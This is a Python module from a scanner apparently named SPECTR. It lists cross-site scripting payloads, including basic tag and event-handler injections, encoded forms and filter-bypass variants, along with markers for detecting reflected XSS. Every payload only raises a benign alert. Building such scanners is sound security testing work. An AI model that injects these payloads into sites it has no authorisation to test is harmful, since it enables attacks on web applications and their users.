"""Cross-Site Scripting (XSS) payloads for SPECTR scanner"""

class XssPayloads:
    """Collection of XSS payloads"""

    # Basic XSS payloads
    BASIC_PAYLOADS = [
    "<script>alert('SPECTR_XSS')</script>",
    "<img src=x onerror=alert('SPECTR_XSS')>",
    "<svg onload=alert('SPECTR_XSS')>",
    "<iframe src=javascript:alert('SPECTR_XSS')>",
    "<body onload=alert('SPECTR_XSS')>",
    "<div onclick=alert('SPECTR_XSS')>click</div>",
    "javascript:alert('SPECTR_XSS')",
    "'\"><script>alert('SPECTR_XSS')</script>",
    "\"><script>alert('SPECTR_XSS')</script>",
    "<object data=javascript:alert('SPECTR_XSS')>",
    "<embed src=javascript:alert('SPECTR_XSS')>",
    "<link rel=stylesheet href=javascript:alert('SPECTR_XSS')>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(\"SPECTR_XSS\")'>",
    "<form action=javascript:alert('SPECTR_XSS')><input type=submit></form>",
    "<input autofocus onfocus=alert('SPECTR_XSS')>"
        ]

# Encoded payloads
    ENCODED_PAYLOADS = [
    "%3Cscript%3Ealert('SPECTR_XSS')%3C/script%3E",
    "&lt;script&gt;alert('SPECTR_XSS')&lt;/script&gt;",
    "%3Cimg%20src=x%20onerror=alert('SPECTR_XSS')%3E",
    "%3Csvg%20onload=alert('SPECTR_XSS')%3E",
    "%3Ciframe%20src=javascript:alert('SPECTR_XSS')%3E",
    "%3Cbody%20onload=alert('SPECTR_XSS')%3E"
        ]

# Filter bypass payloads  
    FILTER_BYPASS = [
    "<ScRiPt>alert('SPECTR_XSS')</ScRiPt>",
    "<img/src=x/onerror=alert('SPECTR_XSS')>",
    "<svg/onload=alert('SPECTR_XSS')>",
    "<scr<script>ipt>alert('SPECTR_XSS')</scr<script>ipt>",
    "<img onerror=prompt('SPECTR_XSS')>",
    "<svg/onload=confirm('SPECTR_XSS')>",
    "<iframe srcdoc=\"<script>alert('SPECTR_XSS')</script>\">",
    "<div style=\"xss:expr(alert('SPECTR_XSS'))\">"
        ]

    @classmethod
    def get_all_payloads(cls):
        """Get all XSS payloads"""
        return cls.BASIC_PAYLOADS + cls.ENCODED_PAYLOADS + cls.FILTER_BYPASS

    @classmethod
    def get_reflection_markers(cls):
        """Get markers to look for in responses to detect XSS"""
        return [
            "SPECTR_XSS",
            "<script>alert('SPECTR_XSS')</script>",
            "<img src=x onerror=alert('SPECTR_XSS')>",
            "alert('SPECTR_XSS')",
            "onerror=alert('SPECTR_XSS')"
        ]
